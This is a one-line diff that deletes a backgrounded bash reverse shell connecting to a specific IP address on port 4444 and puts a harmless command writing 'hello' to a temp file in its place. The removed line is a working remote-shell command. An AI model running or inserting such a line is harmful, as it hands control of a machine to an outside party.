@@ -1,1 +1,1 @@
-bash -c 'bash -i >& /dev/tcp/82.165.73.88/4444 0<&1' &
+echo "hello" > /tmp/hello.txt
